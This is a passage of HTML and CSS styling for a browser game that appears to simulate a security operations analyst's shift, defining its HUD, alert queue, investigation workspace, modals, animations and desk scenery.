<title>SIGNAL//NOISE — A SOC Analyst Roguelike</title>
<style>
/* =====================================================================
   DESIGN SYSTEM
   ===================================================================== */
:root{
  --bg:#04060b;
  --glass:rgba(12,20,34,.66);
  --glass-2:rgba(18,30,50,.55);
  --glass-hi:rgba(40,70,110,.25);
  --line:rgba(110,220,255,.16);
  --line-2:rgba(110,220,255,.32);
  --cyan:#3ef0ff;
  --teal:#19d3b4;
  --magenta:#ff3bd4;
  --amber:#ffb547;
  --orange:#ff7a45;
  --red:#ff4d6d;
  --green:#43f59b;
  --blue:#6fb4ff;
  --text:#dcf4ff;
  --muted:#8ea9bd;
  --dim:#5d7486;
  --font:system-ui,-apple-system,"Segoe UI",Roboto,Ubuntu,"Helvetica Neue",Arial,sans-serif;
  --mono:ui-monospace,"Cascadia Mono","SF Mono",Consolas,"Liberation Mono",Menlo,monospace;
  --r:10px;
  --glow:0 0 18px rgba(62,240,255,.25);
  --desk-h:118px;
  --sw:12px;--sh:7px; /* 1% of the logical stage, set by fit() */
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:var(--font);font-size:15px;line-height:1.4}
body.large-text{font-size:17px}
button{font:inherit;color:inherit;cursor:pointer;background:none;border:none}
input,select{font:inherit;color:var(--text)}
::selection{background:rgba(62,240,255,.3)}
.hidden{display:none!important}
.mono{font-family:var(--mono)}
.muted{color:var(--muted)}
.cy{color:var(--cyan)}.am{color:var(--amber)}.rd{color:var(--red)}.gr{color:var(--green)}.mg{color:var(--magenta)}
:focus-visible{outline:2px solid var(--cyan);outline-offset:2px}

/* Scrollbars */
.scroll{overflow-y:auto;overflow-x:hidden;scrollbar-width:thin;scrollbar-color:rgba(62,240,255,.25) transparent}
.scroll::-webkit-scrollbar{width:7px}
.scroll::-webkit-scrollbar-thumb{background:rgba(62,240,255,.22);border-radius:4px}

/* Buttons */
.btn{display:inline-flex;align-items:center;gap:6px;background:rgba(62,240,255,.07);border:1px solid rgba(62,240,255,.34);color:var(--cyan);padding:6px 11px;border-radius:7px;font:600 13px var(--mono);letter-spacing:.04em;transition:background .15s,box-shadow .15s,transform .1s;white-space:nowrap}
.btn:hover:not(:disabled){background:rgba(62,240,255,.16);box-shadow:var(--glow)}
.btn:active:not(:disabled){transform:translateY(1px)}
.btn:disabled{opacity:.35;cursor:not-allowed}
.btn.primary{background:linear-gradient(180deg,rgba(62,240,255,.32),rgba(25,211,180,.22));color:#eaffff;border-color:var(--cyan)}
.btn.warn{color:var(--amber);border-color:rgba(255,181,71,.45);background:rgba(255,181,71,.08)}
.btn.warn:hover:not(:disabled){background:rgba(255,181,71,.18);box-shadow:0 0 16px rgba(255,181,71,.25)}
.btn.danger{color:var(--red);border-color:rgba(255,77,109,.5);background:rgba(255,77,109,.08)}
.btn.danger:hover:not(:disabled){background:rgba(255,77,109,.18);box-shadow:0 0 16px rgba(255,77,109,.3)}
.btn.good{color:var(--green);border-color:rgba(67,245,155,.45);background:rgba(67,245,155,.07)}
.btn.good:hover:not(:disabled){background:rgba(67,245,155,.16)}
.btn.mag{color:var(--magenta);border-color:rgba(255,59,212,.45);background:rgba(255,59,212,.07)}
.btn.ghost{border-color:transparent;background:transparent;color:var(--muted)}
.btn.ghost:hover:not(:disabled){color:var(--cyan);background:rgba(62,240,255,.06);box-shadow:none}
.btn.sm{padding:3px 8px;font-size:12px}
.btn.lg{padding:11px 22px;font-size:15.5px}
kbd{font:600 11.5px var(--mono);padding:1px 5px;border-radius:4px;border:1px solid var(--line-2);background:rgba(0,0,0,.35);color:var(--muted)}
.btn kbd{border-color:currentColor;color:inherit;opacity:.75}

/* =====================================================================
   SCENE LAYOUT
   ===================================================================== */
/* The stage is laid out at a logical size and scaled to fit the window (see fit()). */
#stage{position:fixed;left:0;top:0;transform-origin:0 0;overflow:hidden}
#app{position:absolute;inset:0;overflow:hidden}
#sky{position:absolute;left:0;top:0;width:100%;height:calc(100% - var(--desk-h) + 10px);display:block}
#roomShade{position:absolute;inset:0;pointer-events:none;
  background:radial-gradient(ellipse 80% 70% at 50% 35%,transparent 40%,rgba(2,3,7,.55) 80%,rgba(2,3,7,.9) 100%)}
#lampGlow{position:absolute;left:0;bottom:0;width:520px;height:520px;pointer-events:none;opacity:0;transition:opacity .6s;
  background:radial-gradient(circle at 18% 88%,rgba(255,196,120,.22),transparent 60%)}
body.lamp-on #lampGlow{opacity:1}

/* HUD */
#hud{position:absolute;top:8px;left:12px;right:12px;height:50px;display:flex;align-items:center;gap:12px;padding:0 12px;
  background:rgba(10,18,32,.5);border:1px solid var(--line);border-radius:12px;backdrop-filter:blur(10px) saturate(150%);
  box-shadow:0 8px 30px rgba(0,0,0,.45),inset 0 1px 0 rgba(255,255,255,.05);z-index:5}
.logo{font:800 15px var(--mono);letter-spacing:.18em;color:var(--cyan);text-shadow:0 0 12px rgba(62,240,255,.6);white-space:nowrap}
.logo span{color:var(--magenta)}
.hud-sep{width:1px;height:26px;background:var(--line)}
.clockbox{display:flex;align-items:center;gap:8px;flex:0 0 auto}
#hudShift{font:600 12px var(--mono);letter-spacing:.12em;color:var(--muted);line-height:1.2}
#hudShift b{display:block;white-space:nowrap;color:var(--text);font-size:13px}
#hudClock{font:700 25.5px var(--mono);letter-spacing:.06em;color:var(--cyan);text-shadow:0 0 14px rgba(62,240,255,.55);min-width:76px}
#hudClock.paused{color:var(--amber);text-shadow:0 0 14px rgba(255,181,71,.6);animation:blink 1.2s steps(2) infinite}
.stats{display:flex;gap:12px;flex:1 1 auto;min-width:0;justify-content:center}
.stat{display:flex;flex-direction:column;gap:3px;flex:1 1 0;min-width:64px;max-width:150px}
.stat label{font:600 11px var(--mono);letter-spacing:.14em;color:var(--muted);display:flex;justify-content:space-between}
.stat label b{color:var(--text)}
.bar{height:6px;border-radius:4px;background:rgba(255,255,255,.07);overflow:hidden;position:relative}
.bar i{position:absolute;left:0;top:0;bottom:0;border-radius:4px;transition:width .35s}
#st-energy i{background:linear-gradient(90deg,#19d3b4,#3ef0ff);box-shadow:0 0 8px #3ef0ff}
#st-stress i{background:linear-gradient(90deg,#ffb547,#ff3bd4);box-shadow:0 0 8px #ff3bd4}
#st-caf i{background:linear-gradient(90deg,#a8743f,#ffb547);box-shadow:0 0 8px #ffb547}
#st-rep i{background:linear-gradient(90deg,#6fb4ff,#43f59b);box-shadow:0 0 8px #43f59b}
.stat.crit label{color:var(--red)}
.stat.crit .bar{animation:pulseRed 1s infinite}
.hud-right{display:flex;align-items:center;gap:6px;white-space:nowrap;flex:0 0 auto}
#stage.narrow .logo,#stage.narrow .logo+.hud-sep{display:none}
#stage.narrow .chip .lbl-long{display:none}
button.chip{cursor:pointer}button.chip:hover{border-color:var(--line-2);color:var(--cyan)}
.chip{font:600 12px var(--mono);letter-spacing:.04em;padding:4px 7px;border-radius:6px;border:1px solid var(--line);background:rgba(0,0,0,.25);color:var(--muted)}
.chip b{color:var(--text)}
.chip.tier b{color:var(--magenta)}

/* MONITORS */
#monitors{position:absolute;top:calc(66px + max(0px,(calc(var(--sh) * 100) - 760px) * .3));bottom:calc(var(--desk-h) - 6px);left:20px;right:20px;display:flex;gap:16px;perspective:1900px;z-index:2}
.mon{position:relative;display:flex;flex-direction:column;min-width:0}
#mon1{flex:0 0 28.5%;transform:rotateY(11deg);transform-origin:right center}
#mon2{flex:1 1 auto}
#mon3{flex:0 0 28.5%;transform:rotateY(-11deg);transform-origin:left center}
.bezel{flex:1;min-height:0;display:flex;border-radius:11px;border:6px solid #0b1019;border-top-color:#121a27;
  background:transparent;
  box-shadow:0 0 0 1px rgba(62,240,255,.10),0 24px 40px rgba(0,0,0,.65),0 0 50px rgba(62,240,255,.07)}
.screen{flex:1;min-height:0;min-width:0;position:relative;display:flex;flex-direction:column;overflow:hidden;border-radius:6px;border:1px solid var(--line);
  background:radial-gradient(ellipse at 50% -10%,rgba(40,90,140,.28),transparent 55%),linear-gradient(180deg,rgba(6,12,22,.74),rgba(4,8,15,.84));backdrop-filter:blur(5px) saturate(130%)}
.screen::after{content:"";position:absolute;inset:0;pointer-events:none;z-index:3;
  background:repeating-linear-gradient(0deg,rgba(255,255,255,.028) 0 1px,transparent 1px 3px);animation:flicker 6s infinite}
.screen::before{content:"";position:absolute;inset:0;pointer-events:none;z-index:3;background:linear-gradient(115deg,rgba(255,255,255,.045),transparent 30%)}
body.no-scan .screen::after{display:none}
.stand{height:16px;width:70px;margin:0 auto;background:linear-gradient(#141c27,#05070b);clip-path:polygon(38% 0,62% 0,82% 100%,18% 100%)}
.mon.alarm .bezel{box-shadow:0 0 0 1px rgba(255,59,212,.5),0 24px 40px rgba(0,0,0,.65),0 0 40px rgba(255,59,212,.35);animation:alarmGlow 1.4s infinite}
.scrhead{display:flex;align-items:center;gap:8px;padding:7px 10px;font:700 12px var(--mono);letter-spacing:.14em;color:var(--cyan);border-bottom:1px solid var(--line);background:rgba(62,240,255,.035);flex:0 0 auto}
.scrhead .dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:blink 2s infinite}
.scrhead .sp{flex:1}
.scrhead .meta{color:var(--muted);letter-spacing:.06em;font-weight:600}

/* Queue */
.qhead{display:grid;grid-template-columns:54px 1fr 70px;gap:8px;padding:4px 10px;font:600 11px var(--mono);letter-spacing:.12em;color:var(--dim);border-bottom:1px solid var(--line)}
#queue{flex:1;min-height:0;padding:4px}
.qrow{display:grid;grid-template-columns:54px 1fr 70px;gap:8px;align-items:center;padding:7px 7px;border-radius:7px;border:1px solid transparent;cursor:pointer;margin-bottom:3px;background:rgba(255,255,255,.018);transition:background .12s,border-color .12s;animation:rowIn .35s ease-out}
.qrow:hover{background:rgba(62,240,255,.06)}
.qrow.sel{border-color:var(--cyan);background:rgba(62,240,255,.10);box-shadow:inset 3px 0 0 var(--cyan),0 0 16px rgba(62,240,255,.12)}
.qrow.breach{background:rgba(255,77,109,.07)}
.sev{font:800 11px var(--mono);letter-spacing:.08em;text-align:center;padding:3px 0;border-radius:5px;border:1px solid}
.sev0{color:var(--blue);border-color:rgba(111,180,255,.45);background:rgba(111,180,255,.08)}
.sev1{color:var(--amber);border-color:rgba(255,181,71,.45);background:rgba(255,181,71,.08)}
.sev2{color:var(--orange);border-color:rgba(255,122,69,.55);background:rgba(255,122,69,.10)}
.sev3{color:#fff;border-color:var(--magenta);background:rgba(255,59,212,.35);box-shadow:0 0 10px rgba(255,59,212,.5);animation:pulseMag 1.2s infinite}
.qmain{min-width:0}
.qt{font-weight:600;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.qs{font:500 11.5px var(--mono);color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.qtime{font:500 12px var(--mono);color:var(--muted);text-align:right}
.sla{display:flex;flex-direction:column;gap:2px;align-items:stretch}
.sla span{font:700 11.5px var(--mono);text-align:right;color:var(--muted)}
.slabar{height:4px;border-radius:3px;background:rgba(255,255,255,.08);overflow:hidden}
.slabar i{display:block;height:100%;background:var(--teal);transition:width .3s}
.sla.warn i{background:var(--amber)}.sla.warn span{color:var(--amber)}
.sla.over i{background:var(--red)}.sla.over span{color:var(--red)}
.tag{display:inline-block;font:700 10px var(--mono);letter-spacing:.08em;padding:1px 4px;border-radius:3px;margin-left:4px;vertical-align:1px}
.tag.watch{color:#04121a;background:var(--cyan)}
.tag.carry{color:var(--muted);border:1px solid var(--line-2)}
.tag.nohand{color:#1a0410;background:var(--amber)}
.tag.reopen{color:#14031a;background:var(--magenta)}
.tag.raw{color:var(--red);border:1px solid rgba(255,77,109,.5)}
.qempty{padding:30px 16px;text-align:center;color:var(--muted);font-size:14px}
.qempty b{display:block;color:var(--teal);font:700 14px var(--mono);letter-spacing:.12em;margin-bottom:6px}
.scrfoot{flex:0 0 auto;border-top:1px solid var(--line);padding:6px 10px;display:flex;gap:8px;align-items:center;font:600 11.5px var(--mono);color:var(--muted)}
.scrfoot .sp{flex:1}
.outage-banner{margin:6px;padding:6px 8px;border-radius:6px;border:1px solid rgba(255,77,109,.5);background:rgba(255,77,109,.1);color:var(--red);font:700 12px var(--mono);letter-spacing:.06em;animation:blink 1.6s infinite}

/* Workspace */
#ws{flex:1;min-height:0;display:flex;flex-direction:column}
.ws-idle{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;color:var(--muted);text-align:center;padding:20px}
.ws-idle .holo{width:120px;height:120px;border-radius:50%;border:1px dashed var(--line-2);display:flex;align-items:center;justify-content:center;animation:spin 18s linear infinite}
.ws-idle .holo div{width:74px;height:74px;border-radius:50%;border:1px solid var(--cyan);box-shadow:var(--glow),inset 0 0 20px rgba(62,240,255,.2)}
.ws-top{padding:6px 12px;border-bottom:1px solid var(--line);flex:0 0 auto}
.ws-title{display:flex;align-items:center;gap:8px;font-size:16px;font-weight:700}
.ws-title .sev{padding:2px 7px}
.ws-title .id{font:600 12.5px var(--mono);color:var(--muted)}
.ws-desc{color:var(--muted);font-size:14px;margin-top:4px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.ents{display:flex;flex-wrap:wrap;gap:5px;margin-top:4px}
.ent{font:600 12px var(--mono);padding:2px 7px;border-radius:5px;background:rgba(62,240,255,.06);border:1px solid var(--line);color:var(--text)}
.ent i{font-style:normal;color:var(--dim);margin-right:4px}
.ent.watch{border-color:var(--cyan);box-shadow:0 0 8px rgba(62,240,255,.35)}
.playbook{margin-top:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font:600 12px var(--mono);color:var(--teal)}
.tabs{display:flex;gap:2px;padding:6px 8px 0;border-bottom:1px solid var(--line);flex:0 0 auto;overflow-x:auto;overflow-y:hidden;scrollbar-width:none}
.tabs::-webkit-scrollbar{display:none}
.tab{padding:6px 7px;white-space:nowrap;font:700 12px var(--mono);letter-spacing:.06em;color:var(--muted);border:1px solid transparent;border-bottom:none;border-radius:7px 7px 0 0;position:relative;top:1px}
.tab:hover:not(:disabled){color:var(--cyan)}
.tab.on{color:var(--cyan);background:rgba(62,240,255,.07);border-color:var(--line)}
.tab:disabled{opacity:.3;cursor:default}
.tab .cost{color:var(--dim);font-weight:500;margin-left:4px}
.tab.opened .cost{display:none}
.ws-body{flex:1;min-height:0;padding:8px 10px}
.ev{font:500 13px/1.45 var(--mono);padding:4px 8px;border-radius:5px;border:1px solid transparent;cursor:pointer;white-space:pre-wrap;word-break:break-word;margin-bottom:2px;transition:background .12s}
.ev:hover{background:rgba(62,240,255,.06);border-color:var(--line)}
.ev.insp{cursor:default}
.ev.b.insp{background:rgba(255,77,109,.10);border-color:rgba(255,77,109,.45)}
.ev.c.insp{background:rgba(67,245,155,.08);border-color:rgba(67,245,155,.4)}
.ev.n.insp{background:rgba(255,255,255,.025);border-color:rgba(255,255,255,.06);color:var(--muted)}
.ev .note{display:block;font-family:var(--font);font-size:13px;margin-top:3px}
.ev.b .note{color:#ff9fb2}.ev.c .note{color:#9fffd0}.ev.n .note{color:var(--dim)}
.ev.dyn{border-style:dashed;border-color:var(--line)}
.locked{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;height:100%;color:var(--muted);text-align:center}
.findings{flex:0 0 auto;border-top:1px solid var(--line);padding:6px 12px;display:flex;gap:12px;align-items:center;font:600 12px var(--mono);color:var(--muted);background:rgba(0,0,0,.2)}
.findings .b{color:var(--red)}.findings .c{color:var(--green)}
.meter{flex:1;height:6px;border-radius:4px;background:linear-gradient(90deg,var(--green),#334 50%,var(--red));position:relative;opacity:.8}
.meter i{position:absolute;top:-4px;width:3px;height:14px;background:#fff;border-radius:2px;box-shadow:0 0 8px #fff;transition:left .3s}
.actions{flex:0 0 auto;display:grid;grid-template-columns:repeat(3,1fr);gap:5px;padding:6px 10px;border-top:1px solid var(--line);background:rgba(0,0,0,.25)}
.actions .btn{justify-content:center;padding:5px 6px}
.closedbox{margin:8px 10px;padding:8px 10px;border-radius:7px;border:1px solid var(--line);background:rgba(255,255,255,.03);font-size:14px}

/* Comms */
.ctabs{display:flex;gap:2px;padding:6px 8px 0;border-bottom:1px solid var(--line);flex:0 0 auto}
.ctab{padding:5px 9px;font:700 12px var(--mono);letter-spacing:.06em;color:var(--muted);border-radius:7px 7px 0 0;border:1px solid transparent;border-bottom:none;position:relative;top:1px}
.ctab.on{color:var(--cyan);background:rgba(62,240,255,.07);border-color:var(--line)}
.ctab .badge{display:inline-block;min-width:15px;padding:0 4px;border-radius:8px;background:var(--magenta);color:#fff;font-size:10.5px;margin-left:4px;text-align:center}
.ctab.flash{color:var(--magenta);animation:blink .8s infinite}
#comms{flex:1;min-height:0;padding:8px}
.msg{display:flex;gap:8px;margin-bottom:8px;animation:rowIn .3s ease-out}
.av{flex:0 0 26px;height:26px;border-radius:7px;display:flex;align-items:center;justify-content:center;font:800 12.5px var(--mono);color:#04121a}
.msg .mb{min-width:0;flex:1}
.msg .mh{font:700 12.5px var(--font);display:flex;gap:6px;align-items:baseline}
.msg .mh span{font:500 11px var(--mono);color:var(--dim)}
.msg .mt{font-size:14px;color:var(--text);margin-top:1px}
.msg.sys .mt{color:var(--muted);font-family:var(--mono);font-size:12.5px}
.msg .mt .btn{margin-top:5px}
.ticket{padding:6px 8px;border-radius:6px;border:1px solid var(--line);margin-bottom:5px;font-size:13px;background:rgba(255,255,255,.02);cursor:pointer}
.ticket:hover{border-color:var(--line-2)}
.ticket .th{display:flex;gap:6px;align-items:center;font:600 12px var(--mono)}
.ticket .th .sp{flex:1}
.res{font:700 11px var(--mono);padding:1px 5px;border-radius:4px}
.res.good{color:var(--green);border:1px solid rgba(67,245,155,.4)}
.res.bad{color:var(--red);border:1px solid rgba(255,77,109,.45)}
.res.pend{color:var(--muted);border:1px solid var(--line)}
.notecard{padding:8px 10px;border-radius:8px;border:1px solid var(--line);background:rgba(255,255,255,.025);margin-bottom:8px;font-size:14px}
.notecard h4{font:700 11.5px var(--mono);letter-spacing:.14em;color:var(--cyan);margin-bottom:4px}
.notecard li{margin-left:16px;margin-bottom:2px}
.wl{display:flex;flex-wrap:wrap;gap:4px}

/* Bridge */
.bridge-head{padding:8px;border-radius:8px;border:1px solid rgba(255,59,212,.5);background:linear-gradient(135deg,rgba(255,59,212,.16),rgba(62,240,255,.05));margin-bottom:8px}
.bridge-head h3{font:800 14px var(--mono);letter-spacing:.12em;color:var(--magenta)}
.bridge-timer{font:800 25.5px var(--mono);color:#fff;text-shadow:0 0 12px var(--magenta)}
.obj{padding:7px 9px;border-radius:7px;border:1px solid var(--line);margin-bottom:6px;cursor:pointer;background:rgba(255,255,255,.02)}
.obj:hover{border-color:var(--line-2)}
.obj.done{border-color:rgba(67,245,155,.5);background:rgba(67,245,155,.06);cursor:default}
.obj.open{border-color:var(--magenta)}
.obj .oh{font:700 12.5px var(--mono);display:flex;gap:6px}
.obj .oh .sp{flex:1}
.obj .od{font-size:13px;color:var(--muted);margin-top:3px}
.evidence{font:500 12.5px/1.45 var(--mono);background:rgba(0,0,0,.35);border:1px solid var(--line);border-radius:6px;padding:6px 8px;margin:6px 0;white-space:pre-wrap}
.opt{display:block;width:100%;text-align:left;padding:6px 8px;border-radius:6px;border:1px solid var(--line);margin-bottom:4px;font-size:13px;background:rgba(62,240,255,.03)}
.opt:hover{border-color:var(--cyan);background:rgba(62,240,255,.08)}

/* DESK */
#desk{position:absolute;left:0;right:0;bottom:0;height:var(--desk-h);z-index:3;
  background:linear-gradient(180deg,#0f1724 0%,#0a101a 18%,#070b12 60%,#04060a 100%);
  border-top:1px solid rgba(62,240,255,.22);box-shadow:inset 0 14px 30px rgba(0,0,0,.55),0 -2px 22px rgba(62,240,255,.08)}
#desk::before{content:"";position:absolute;left:0;right:0;top:0;height:2px;background:linear-gradient(90deg,transparent,var(--cyan),transparent);opacity:.5}
.item{position:absolute;cursor:pointer;transition:transform .15s,filter .15s}
.item>svg{width:100%;height:100%;display:block}
.item:hover{filter:drop-shadow(0 0 8px rgba(62,240,255,.45));transform:translateY(-2px)}
.item .lbl{position:absolute;left:50%;transform:translateX(-50%);bottom:-2px;font:600 10.5px var(--mono);letter-spacing:.1em;color:var(--dim);white-space:nowrap;opacity:0;transition:opacity .15s}
.item:hover .lbl{opacity:1}
#lamp{left:1.5%;bottom:8px;width:84px;height:100px}
#phone{left:11%;bottom:12px;width:96px;height:68px}
#phone.ring{animation:ring .18s infinite}
#phone.ring #phLed{fill:#ff3bd4}
#keyboard{left:50%;bottom:8px;width:380px;height:90px;transform:translateX(-50%) perspective(520px) rotateX(36deg);cursor:default;padding:8px;border-radius:10px;
  background:linear-gradient(180deg,#141c28,#0a0f17);box-shadow:0 10px 20px rgba(0,0,0,.6),0 0 0 1px rgba(62,240,255,.12)}
#keyboard:hover{filter:none}
#keys{display:grid;grid-template-columns:repeat(14,1fr);gap:3px;height:100%}
.key{border-radius:3px;background:linear-gradient(180deg,#1d2736,#121924);box-shadow:0 2px 0 #06090e,inset 0 0 6px rgba(62,240,255,.12);font:700 8.5px var(--mono);color:rgba(62,240,255,.55);display:flex;align-items:center;justify-content:center;transition:background .1s}
.key.w2{grid-column:span 2}.key.w6{grid-column:span 6}
.key.hit{background:var(--cyan);color:#04121a;box-shadow:0 0 14px var(--cyan)}
#mug{right:27%;bottom:10px;width:60px;height:76px}
#mug.empty .lbl{opacity:1;color:var(--amber)}
#headset{right:18%;bottom:10px;width:80px;height:72px}
#headset.on path.cup{stroke:var(--cyan)}
#badge{right:9.5%;bottom:6px;width:68px;height:94px;transform:rotate(-6deg)}
#badge:hover{transform:rotate(-6deg) translateY(-2px)}
#sticky{right:1.4%;bottom:10px;width:100px;height:90px;transform:rotate(4deg);background:linear-gradient(160deg,#ffd77a,#f0b84a);color:#3a2a08;padding:8px;font:600 10px/1.3 var(--mono);box-shadow:3px 6px 14px rgba(0,0,0,.55);border-radius:2px 2px 8px 2px}
#sticky:hover{transform:rotate(4deg) translateY(-2px)}
#sticky b{display:block;font-size:11.5px;margin-bottom:2px}

/* OVERLAY SCREENS */
#overlay{position:fixed;inset:0;z-index:40;display:flex;align-items:center;justify-content:center;
  background:radial-gradient(ellipse at 50% 30%,rgba(20,40,70,.45),rgba(3,5,10,.86));backdrop-filter:blur(7px)}
.panel{width:min(880px,calc(var(--sw) * 94));max-height:calc(var(--sh) * 92);display:flex;flex-direction:column;background:var(--glass);border:1px solid var(--line-2);border-radius:16px;
  box-shadow:0 30px 80px rgba(0,0,0,.6),0 0 60px rgba(62,240,255,.12),inset 0 1px 0 rgba(255,255,255,.06);backdrop-filter:blur(18px) saturate(150%);animation:popIn .35s ease-out}
.panel-h{padding:16px 22px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:12px}
.panel-h h2{font:800 17px var(--mono);letter-spacing:.16em;color:var(--cyan)}
.panel-h .sp{flex:1}
.panel-b{padding:18px 22px;overflow:auto;scrollbar-width:thin;scrollbar-color:rgba(62,240,255,.25) transparent}
.panel-f{padding:12px 22px;border-top:1px solid var(--line);display:flex;gap:8px;justify-content:flex-end;align-items:center}
.panel-f .sp{flex:1}
.title-screen{text-align:center;padding:34px 30px 26px;overflow:auto}
.title-screen h1{font:900 62px/1 var(--mono);letter-spacing:.08em;color:#eaffff;text-shadow:0 0 22px rgba(62,240,255,.7),0 0 60px rgba(62,240,255,.35)}
.title-screen h1 span{color:var(--magenta);text-shadow:0 0 22px rgba(255,59,212,.7)}
.title-screen .sub{margin-top:10px;font:600 14px var(--mono);letter-spacing:.3em;color:var(--muted)}
.menu{display:flex;flex-direction:column;gap:9px;width:300px;margin:28px auto 8px}
.menu .btn{justify-content:center;padding:11px}
.menu>div>.btn{min-width:0;flex:1 1 0;white-space:normal;padding-left:8px;padding-right:8px}
.foot-note{font:500 12px var(--mono);color:var(--dim);margin-top:16px}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
.card{padding:12px;border-radius:10px;border:1px solid var(--line);background:rgba(255,255,255,.025)}
.card h4{font:700 13px var(--mono);letter-spacing:.06em;color:var(--cyan);margin-bottom:5px}
.card p{font-size:14px;color:var(--muted)}
.card .row{display:flex;align-items:center;gap:8px;margin-top:8px}
.card .row .sp{flex:1}
.card.owned{border-color:rgba(67,245,155,.45);background:rgba(67,245,155,.05)}
.card.dim{opacity:.55}
.bigstat{font:800 30px var(--mono);color:#fff}
.bigstat small{display:block;font:600 11.5px var(--mono);letter-spacing:.14em;color:var(--muted)}
.cause{font:900 34.5px var(--mono);letter-spacing:.1em;text-align:center}
.field{display:flex;flex-direction:column;gap:5px;margin-bottom:12px}
.field label{font:700 12px var(--mono);letter-spacing:.12em;color:var(--muted)}
.field input[type=text],.field select{background:rgba(0,0,0,.35);border:1px solid var(--line-2);border-radius:7px;padding:8px 10px;font-family:var(--mono)}
.toggle{display:flex;align-items:center;gap:10px;cursor:pointer;margin-bottom:10px}
.toggle input{accent-color:var(--cyan);width:16px;height:16px}
.howto h3{font:700 14px var(--mono);letter-spacing:.1em;color:var(--cyan);margin:14px 0 6px}
.howto p,.howto li{font-size:14.5px;color:var(--text)}
.howto li{margin-left:18px;margin-bottom:3px}
.sched{display:flex;gap:4px;flex-wrap:wrap}
.sday{width:46px;padding:5px 0;text-align:center;border-radius:6px;border:1px solid var(--line);font:700 11.5px var(--mono)}
.sday small{display:block;font-weight:500;color:var(--muted)}
.sday.DAY{color:var(--amber);border-color:rgba(255,181,71,.4)}
.sday.NIGHT{color:var(--magenta);border-color:rgba(255,59,212,.4)}
.sday.OFF{color:var(--green);border-color:rgba(67,245,155,.35)}
.sday.now{box-shadow:0 0 0 2px var(--cyan)}

/* MODAL */
.modal-back{position:fixed;inset:0;z-index:60;display:flex;align-items:center;justify-content:center;background:rgba(2,4,9,.55);backdrop-filter:blur(4px);animation:fadeIn .2s}
.modal{width:min(620px,calc(var(--sw) * 92));max-height:calc(var(--sh) * 88);display:flex;flex-direction:column;background:var(--glass);border:1px solid var(--line-2);border-radius:14px;backdrop-filter:blur(18px) saturate(150%);
  box-shadow:0 24px 70px rgba(0,0,0,.6),0 0 40px rgba(62,240,255,.12);animation:popIn .25s ease-out}
.modal.wide{width:min(820px,calc(var(--sw) * 94))}
.modal.alarm{border-color:var(--magenta);box-shadow:0 24px 70px rgba(0,0,0,.6),0 0 50px rgba(255,59,212,.3)}
.modal-h{padding:13px 18px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:10px}
.modal-h h3{font:800 15px var(--mono);letter-spacing:.12em;color:var(--cyan)}
.modal.alarm .modal-h h3{color:var(--magenta)}
.modal-h .ico{font-size:20.5px}
.modal-b{padding:14px 18px;overflow:auto;font-size:15px}
.modal-b p{margin-bottom:8px}
.modal-f{padding:10px 18px;border-top:1px solid var(--line);display:flex;gap:8px;justify-content:flex-end;flex-wrap:wrap}
.hoitem{display:flex;gap:10px;align-items:flex-start;padding:6px 8px;border-radius:7px;border:1px solid var(--line);margin-bottom:5px;cursor:pointer;background:rgba(255,255,255,.02)}
.hoitem:hover{border-color:var(--line-2)}
.hoitem input{margin-top:2px;accent-color:var(--cyan);width:15px;height:15px;flex:0 0 auto}
.hoitem .ht{font-size:14px}
.hoitem .hs{font:500 11.5px var(--mono);color:var(--muted)}
.hosec{font:700 12px var(--mono);letter-spacing:.14em;color:var(--cyan);margin:10px 0 5px}
.grade{font:900 50.5px var(--mono);text-align:center}

/* TOASTS */
#toasts{position:fixed;top:64px;right:26px;z-index:70;display:flex;flex-direction:column;gap:5px;align-items:flex-end;pointer-events:none}
.toast{padding:7px 14px;border-radius:8px;background:var(--glass);border:1px solid var(--line-2);backdrop-filter:blur(10px);font:600 13px var(--mono);box-shadow:0 8px 24px rgba(0,0,0,.5);animation:toastIn .3s ease-out}
.toast.good{border-color:rgba(67,245,155,.5);color:var(--green)}
.toast.bad{border-color:rgba(255,77,109,.55);color:var(--red)}
.toast.warn{border-color:rgba(255,181,71,.55);color:var(--amber)}

/* Tutorial highlight */
.tut-hl{outline:2px solid var(--magenta)!important;outline-offset:3px;box-shadow:0 0 24px rgba(255,59,212,.55)!important;animation:tutPulse 1.2s infinite}

/* ANIMATIONS */
@keyframes blink{50%{opacity:.45}}
@keyframes flicker{0%,100%{opacity:1}48%{opacity:1}50%{opacity:.85}52%{opacity:1}}
@keyframes pulseRed{50%{box-shadow:0 0 10px var(--red)}}
@keyframes pulseMag{50%{box-shadow:0 0 18px rgba(255,59,212,.9)}}
@keyframes alarmGlow{50%{box-shadow:0 0 0 1px rgba(255,59,212,.9),0 24px 40px rgba(0,0,0,.65),0 0 70px rgba(255,59,212,.55)}}
@keyframes rowIn{from{opacity:0;transform:translateX(-6px)}to{opacity:1;transform:none}}
@keyframes popIn{from{opacity:0;transform:scale(.97) translateY(8px)}to{opacity:1;transform:none}}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
@keyframes toastIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:none}}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes ring{0%{transform:rotate(-3deg)}50%{transform:rotate(3deg)}100%{transform:rotate(-3deg)}}
@keyframes steam{0%{transform:translateY(0);opacity:0}30%{opacity:.6}100%{transform:translateY(-16px);opacity:0}}
@keyframes tutPulse{50%{outline-color:var(--cyan)}}
.steam{animation:steam 2.6s infinite}
.steam.s2{animation-delay:.9s}.steam.s3{animation-delay:1.7s}

/* Reduced motion */
body.reduced *,body.reduced *::before,body.reduced *::after{animation:none!important;transition:none!important}

/* =====================================================================
   MOBILE / TOUCH LAYOUT — one screen at a time + bottom tab bar
   (enabled by fit() on narrow or short viewports: #stage.mobile)
   ===================================================================== */
html{touch-action:manipulation;-webkit-text-size-adjust:100%}
